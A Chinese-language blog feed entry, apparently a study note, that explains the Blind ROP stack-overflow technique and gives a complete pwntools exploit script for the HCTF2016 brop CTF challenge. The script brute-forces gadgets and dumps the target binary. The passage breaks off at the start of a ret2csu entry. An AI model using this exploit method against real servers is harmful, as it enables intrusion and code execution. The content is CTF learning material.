      <url>/2022/12/25/pwn-BROP/</url>
      
        <content type="html"><![CDATA[<p>这块内容比较比较多，就单独拉出一篇来记录了</p><h2 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h2><p>在没有获取到对应的源码和二进制文件下对程序进行攻击，劫持程序控制流</p><h2 id="相关概念"><a class="markdownIt-Anchor" href="#相关概念"></a> 相关概念</h2><ul><li>阻塞读取：在阻塞模式下，如果程序可以进行读写就读写，反之就休眠进程，释放CPU资源</li><li>非阻塞读取：在非阻塞模式下，如果程序可以进行读写就读写，反之跳过读写，继续执行程序</li><li>阻塞和非阻塞的实现方式都是靠设备驱动程序</li></ul><h2 id="攻击条件"><a class="markdownIt-Anchor" href="#攻击条件"></a> 攻击条件</h2><ul><li><strong>源程序必须存在栈溢出漏洞</strong>，以便于攻击者可以控制程序流程。</li><li>服务器端的进程在崩溃之后会重新启动，并且<strong>重新启动的进程的地址与先前的地址一样</strong></li></ul><p>为了达成攻击我们需要足够多的gadgets来进行write系统调用，能够让我们让我们从二进制中dump更多核心字节内容到攻击者socket；通过这些手段我们便可以开始基础的ROP攻击，攻击除了可以攻击一些专线进程服务，针对一些非开源的主流服务也是十分有效的手段</p><p>我们之所以能够攻击完全是因为程序在崩溃后Fork了一个新进程，并没有进行任何的随机化处理，nginx工作方式就符合上诉</p><h2 id="攻击预览"><a class="markdownIt-Anchor" href="#攻击预览"></a> 攻击预览</h2><ul><li><code>stack reading</code>: 找到返回地址或者canaries之类的信息</li><li>Find <code>stop gadget</code>: 需要找到这个gadget我们才能找到其他的gadget</li><li>Find <code>BROP gadget</code>: 允许我们控制调用的前两个参数的gadget</li><li>Find <code>call strcmp</code>: 可以让我们设置调用函数的第三个参数值大于0</li><li>Find <code>call write</code></li><li>Write binary to socket</li><li>Dump <code>symbol tabls</code>: 攻击者通过字节交互dump出有用信息，类似于execve等有用信息，并且可以可以注入构造的shellcode从而拿到shell</li></ul><p>更多的内容网上的更全，只是列一个大纲方便回忆</p><h2 id="dump内存"><a class="markdownIt-Anchor" href="#dump内存"></a> Dump内存</h2><p>我们首先需要的是把内存从服务端dump到本地，所以我们需要构造一个ROP链，基本如下<br />write(int sock,void *buff,int len)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop rdi ; ret;</span><br><span class="line">pop rsi ; ret;</span><br><span class="line">pop rdx ; ret;</span><br><span class="line">call write ; ret;</span><br></pre></td></tr></table></figure><p>但是在此之前我们需要做一些准备工作，对于未知的远端程序要直接找到这样符合要求的gadgets几乎是不可能的，并且一般的服务器还对此开启了ASLR，Canary等防护</p><h3 id="canary防护绕过"><a class="markdownIt-Anchor" href="#canary防护绕过"></a> Canary防护绕过</h3><p>这里用<code>stack reading</code>的方法，以下列栈为列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer[4096b]--canary[8]--frame pointer--return addr</span><br></pre></td></tr></table></figure><p>这里我们在覆盖的时候将x填写到4097bit处，为canary的第一位，此时如果x刚好与canary的第一位符合那么程序便不会崩溃，直到最后一位尝试结束后程序不会崩溃我们就拿到了canary值</p><h3 id="寻找stop-gadget"><a class="markdownIt-Anchor" href="#寻找stop-gadget"></a> 寻找stop gadget</h3><p>一般情况下我们如果在rop的return address处放置一段任意地址那么程序很大可能会直接crash，造成交互链接被远程关闭；那么如果这个时候出现了一种特殊情况，程序return address指向了特殊的代码段，程序跳转到那里后并不会crash，而是造成了无限循环；这可以是攻击者长期与保持会话连接，对我们寻找其余的gadgets起到了很大的作用</p><h3 id="寻找可利用gadget"><a class="markdownIt-Anchor" href="#寻找可利用gadget"></a> 寻找可利用gadget</h3><p>假设此时也找到了stop gadget；</p><p>我们此时仅能在栈上进行操作，通过覆盖return address进行后续的操作，如果我们此时找到了例如<code>pop rdi;ret;</code>这样有用的gadget，程序执行这个有效gadget后还是会继续跳转到栈上的下一个地址进行执行，并且也是大几率直接crash。栈结构如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer--ret(useful gadget)--0xdeadbeef-0xdeafbeef</span><br></pre></td></tr></table></figure><p>这一过程在攻击者看来只是一个普通的程序crash流程，因为攻击者也不知道程序再此之前已经执行过了useful gadget；<strong>但是，此时我们上一个步骤找到的stop gadget就起到了作用</strong>，我们只需要把stop gadget在return address后面填充足够多，那么就能保证在程序不崩溃的情况下筛选出<code>有效的gadget</code>或者是<code>stop gadget</code>，我这里提到的刚好是另一个stop gadget是一种特殊情况，不过不要紧，后序还会对这些进行验证筛选</p><h3 id="dump内存-2"><a class="markdownIt-Anchor" href="#dump内存-2"></a> dump内存</h3><p>到这一步我们手里面应该有了canary值、有效stop gadgets、和一些useful gadget；我们的任务就是从其中找到dump数据所需要的四个gadgets</p><p>首先我们需要找到brop gadget，这里借用一下wooyun匿名人士的过程图<br /><img src="/pictures/brop.png" alt="brop_gadget" /><br /><code>pop rsi;ret</code>和<code>pop rdi;ret</code>这两个gadget借助<code>top gadget</code>是容易找到的，但是<code>pop rdx；ret;</code>这个gadget很难找到，作者这里提出了一种思路就是把管理rdx这项工作交给strcmp，因为在调用改函数时，函数会把字符串长度赋值给rdx</p><p><strong>寻找brop gadget:</strong><br />我们需要寻找的<code>brop gadget</code>需要依次pop 6个寄存器，形式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop rbx</span><br><span class="line">pop rbp</span><br><span class="line">pop r12</span><br><span class="line">pop r13</span><br><span class="line">pop r14</span><br><span class="line">pop r15</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>寻找brop gadget的方法很简单，如下栈，就不用–链接了，直接回车直观点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">stop gadget</span><br><span class="line">crash gadget</span><br><span class="line">crash gadget</span><br><span class="line">crash gadget</span><br><span class="line">crash gadget</span><br><span class="line">crash gadget</span><br><span class="line">crash gadget</span><br><span class="line">return address(brop gadget)</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure><p>如果这里ret执行地址刚好是brop gadget跳转执行后，那么我们后面的crash gadget就不会对程序造成影响，程序依然会进入挂起状态</p><p><strong>寻找@plt</strong><br />这个东西有什么用就不多解释了，直接看图<br /><img src="/pictures/plt2got.png" alt="plt2got" /></p><p>plt每一项都是16字节对齐的，第0个字节指向该对应函数的fastpath，第6个字节指向该对应函数的slowpath；<br />大部分的plt项都不会因为传进来的参数而导致程序crash，只是会返回DEFALUT错误；所以我们判读这是否是一个plt项的条件就是很多连续的16字节对齐地址，并且都不对程序造成crash；地址+6访问slowpath也不会造成程序的crash，那么这很可能就是plt项了</p><p><strong>判断strcmp或者write</strong><br />上面提到brop gadget可以让我们自由控制前两个参数值，可以根据strcmp的以下特点找到对应plt项<br />strcmp：</p><table><thead><tr><th style="text-align:center">arg1</th><th style="text-align:center">arg2</th><th style="text-align:center">result</th></tr></thead><tbody><tr><td style="text-align:center">readable</td><td style="text-align:center">0x0</td><td style="text-align:center">crash</td></tr><tr><td style="text-align:center">0x0</td><td style="text-align:center">readable</td><td style="text-align:center">crash</td></tr><tr><td style="text-align:center">0x0</td><td style="text-align:center">0x0</td><td style="text-align:center">crash</td></tr><tr><td style="text-align:center">readable</td><td style="text-align:center">readable</td><td style="text-align:center">nocrash</td></tr></tbody></table><p>而write就简单了，直接调用向交互写入看看有没有回显我们就能轻易判断，最后一步就是如何确定传给write的socket文件描述符是多少了。<br />这里有两种办法：</p><ol><li>同时调用好几次write，把它们串起来，然后传入不同的文件描述符数</li><li>同时打开多个连接，然后使用一个相对较大的文件描述符数字，增加匹配的可能性<br />到这一步为止，攻击者就能够将整个.text段从内存中通过socket写到本地来了，然后就可以对其进行反编译，找到其他更多的gadgets，同时，攻击者还可以dump那些symbol table之类的信息，找到PLT中其它对应的函数项如dup2和execve等</li></ol><h2 id="实行攻击"><a class="markdownIt-Anchor" href="#实行攻击"></a> 实行攻击</h2><ul><li>重定向socket IO（交互输入输出）</li><li>想办法搞到/bin/sh;这里如果在dump下来的内存中没找到可以选择找一段可写区域把字段内容读过去</li><li>execve执行，不行就试试找到<code>pop rax;ret;</code>和<code>call syscall</code>进行系统调用</li></ul><h2 id="ending"><a class="markdownIt-Anchor" href="#ending"></a> Ending</h2><p>可以说原理并不是很复杂，主要难度体现在dump数据这一部分，我们搜集到了足够多的<code>useful gadget</code>这一个步骤的难度就会降低；接下来明天或者之后更新一下模拟brop crack；是算是我接触到一种新的攻击方式，感觉Bind ROP还是很酷的。</p><hr /><h2 id="update-20221227"><a class="markdownIt-Anchor" href="#update-20221227"></a> Update: 2022/12/27</h2><p>更新：不新开了，直接在概念下更新例解</p><h2 id="hctf2016-brop"><a class="markdownIt-Anchor" href="#hctf2016-brop"></a> HCTF2016 brop</h2><h3 id="service"><a class="markdownIt-Anchor" href="#service"></a> service</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -vc ./a.out -kl 127.0.0.1 2710</span><br></pre></td></tr></table></figure><h3 id="checksec"><a class="markdownIt-Anchor" href="#checksec"></a> checksec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>比起原文提到的少了Canary，方便多了</p><h3 id="source"><a class="markdownIt-Anchor" href="#source"></a> Source</h3><p>Github提供程序和源码下载，实在不懂可以看着源码分析<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop">Github</a></p><h3 id="exploit"><a class="markdownIt-Anchor" href="#exploit"></a> Exploit</h3><p>需要注意的事项：</p><ol><li>在获取stop gadget时</li></ol><ul><li>需要我们保持可以输入下一段payload的状态，找到对应的程序入口地址</li><li>需要处理的情况包含进入了其他入口、地址包含错误内容导致程序崩溃</li></ul><ol start="2"><li>寻找寄存器控制地址</li></ol><ul><li>这里需要十分注意以下，pop r15; ret对应的字节码是<code>41 5F C3</code>，而pop rdi;ret;对应的字节码是<code>5F C3</code>,以下是<code>x64 brop gadget</code>的机器码形式，顺便推一下这个网站<a href="https://defuse.ca/online-x86-assembler.htm#disassembly">disassembly</a><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">4007ba:5b                   pop    %rbx</span><br><span class="line">4007bb:5d                   pop    %rbp</span><br><span class="line">4007bc:41 5c                pop    %r12</span><br><span class="line">4007be:41 5d                pop    %r13</span><br><span class="line">4007c0:41 5e                pop    %r14</span><br><span class="line">4007c2:41 5f                pop    %r15</span><br><span class="line">4007c4:c3                   ret</span><br></pre></td></tr></table></figure></li><li>由此我们推断出pop rdi; ret;的机器码是<code>5F C3</code>,地址是<code>brop_gadget+9</code></li></ul><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Protection :Canary NX FORTIFY</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_overflow_len</span>():</span><br><span class="line">    <span class="built_in">len</span>=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">            p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="built_in">len</span>)</span><br><span class="line">            string = p.recv()</span><br><span class="line">            <span class="keyword">if</span> string.startswith(<span class="string">b&#x27;No password&#x27;</span>):</span><br><span class="line">                p.close()</span><br><span class="line">                <span class="built_in">len</span>+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=========Get Overflow Lenth==========&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">len</span>-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_stop_gadget</span>(<span class="params">buff</span>):</span><br><span class="line">    based_addr=<span class="number">0x4005c0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Function recved:&quot;</span>+<span class="built_in">str</span>(buff))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========Get Stop gadget==========&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Try:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(based_addr)))</span><br><span class="line">            p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*buff+p64(based_addr)</span><br><span class="line">            p.send(payload)</span><br><span class="line">            string = p.recv()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> string.startswith(<span class="string">b&#x27;WelCome&#x27;</span>):</span><br><span class="line">                p.close()</span><br><span class="line">                based_addr+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> based_addr</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            based_addr+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">buff,address</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Checking:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(address)))</span><br><span class="line">        p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*buff+p64(address)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">10</span></span><br><span class="line">        p.send(payload)</span><br><span class="line">        string=p.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">123</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;no game&#x27;</span> <span class="keyword">in</span> string:</span><br><span class="line">            <span class="comment">#exit with code 0</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;WelCome&#x27;</span> <span class="keyword">in</span> string:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#return main function</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_brop_gadget</span>(<span class="params">buff,stop_gadget</span>):</span><br><span class="line">    based_addr=<span class="number">0x4007a0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Function recved: &quot;</span>+<span class="built_in">str</span>(buff)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(stop_gadget)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========Get Brop gadget==========&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Try:&quot;</span>+<span class="built_in">hex</span>(based_addr))</span><br><span class="line">            p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*buff+p64(based_addr)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">6</span>+p64(stop_gadget)</span><br><span class="line">            p.send(payload)</span><br><span class="line">            string = p.recv()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> string.startswith(<span class="string">b&#x27;WelCome&#x27;</span>):</span><br><span class="line">                p.close()</span><br><span class="line">                based_addr+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(string)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Possible Address: &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(based_addr)))</span><br><span class="line">                p.close()</span><br><span class="line">                <span class="keyword">if</span> check(buff,based_addr):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;check success!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> based_addr</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;check failed!&quot;</span>)</span><br><span class="line">                based_addr+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            based_addr+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_puts_plt</span>(<span class="params">buff,stop_gadget,pop_rdi</span>):</span><br><span class="line">    based_addr=<span class="number">0x400560</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Function recved:&quot;</span>+<span class="built_in">str</span>(buff)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(stop_gadget))+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(pop_rdi)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========Get Puts plt==========&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Try:&quot;</span>+<span class="built_in">hex</span>(based_addr))</span><br><span class="line">            p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*buff+p64(pop_rdi)+p64(<span class="number">0x400000</span>)+p64(based_addr)+p64(stop_gadget)</span><br><span class="line">            p.send(payload)</span><br><span class="line">            string = p.recv()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;\x7fELF&#x27;</span> <span class="keyword">in</span> string:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Puts PLT:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(based_addr)))</span><br><span class="line">                <span class="keyword">return</span> based_addr</span><br><span class="line">            based_addr+=<span class="number">1</span></span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            based_addr+=<span class="number">1</span></span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data_dump</span>(<span class="params">buff,stop_gadget,pop_rdi,puts_plt,leak_addr</span>):</span><br><span class="line">    <span class="keyword">try</span>:    </span><br><span class="line">        p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*buff+p64(pop_rdi)+p64(leak_addr)+p64(puts_plt)+p64(stop_gadget)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        data = p.recvuntil(<span class="string">b&#x27;\nWelCome my friend&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">            data = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_program</span>(<span class="params">buff_lenth,stop_gadget,pop_rdi,puts_plt,leak_addr</span>): </span><br><span class="line">    dumped = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> leak_addr&lt;<span class="number">0x401000</span>:</span><br><span class="line">        data=data_dump(buff_lenth,stop_gadget,pop_rdi,puts_plt,leak_addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;dumped:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(leak_addr)))</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">            dumped+=data</span><br><span class="line">        leak_addr+=<span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./code&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(dumped)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    buff_lenth = get_overflow_len()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Size:&quot;</span>+<span class="built_in">str</span>(buff_lenth))</span><br><span class="line">    stop_gadget = find_stop_gadget(buff_lenth)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;StopGadget:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(stop_gadget)))</span><br><span class="line">    brop_gadget = find_brop_gadget(<span class="number">72</span>,<span class="number">0x4005d0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;BropGadget:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(brop_gadget)))</span><br><span class="line">    pop_rdi=brop_gadget+<span class="number">9</span></span><br><span class="line">    puts_plt=find_puts_plt(buff_lenth,stop_gadget,pop_rdi)</span><br><span class="line">    leak_addr=<span class="number">0x400000</span></span><br><span class="line">    <span class="comment">#Dump All</span></span><br><span class="line">    leak_program(buff_lenth,stop_gadget,pop_rdi,puts_plt,leak_addr)</span><br></pre></td></tr></table></figure><p>接下来就不写了，就是普通的栈溢出问题，鉴于实战环境是远端机，所以我们还需要找到对应的libc版本。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bind Return Oriented Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-ret2csu-ret2reg</title>
      <link href="/2022/12/24/pwn-ret2csu/"/>
      <url>/2022/12/24/pwn-ret2csu/</url>
      
        <content type="html"><![CDATA[<h2 id="ret2csu"><a class="markdownIt-Anchor" href="#ret2csu"></a> ret2csu</h2><h3 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> <em>概念</em></h3><p>64位程序，程序函数的参数传递都是靠寄存器进行的，这与32位程序压栈函数传递有很大的区别。在进行crack的时候我们构造ROP链需要找到对应的gadgets，在需要传递的参数超过3个的时候往往是找不到的，所以我们就可以在x64程序函数<code>__libc_csu_init</code>函数中找到可利用的通用gadget。关于这个函数，这个函数是用来初始化libc的，而一般的来说，dynamic动态连接都需要进行libc库连接。这个函数各版本的GLIBC是有一定的去别的，但gadget都是几乎可以通用的</p><h3 id="gadget解析和使用"><a class="markdownIt-Anchor" href="#gadget解析和使用"></a> gadget解析和使用</h3><p>此处以下列程序作为举例：<br />·_libc_init_csu·:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 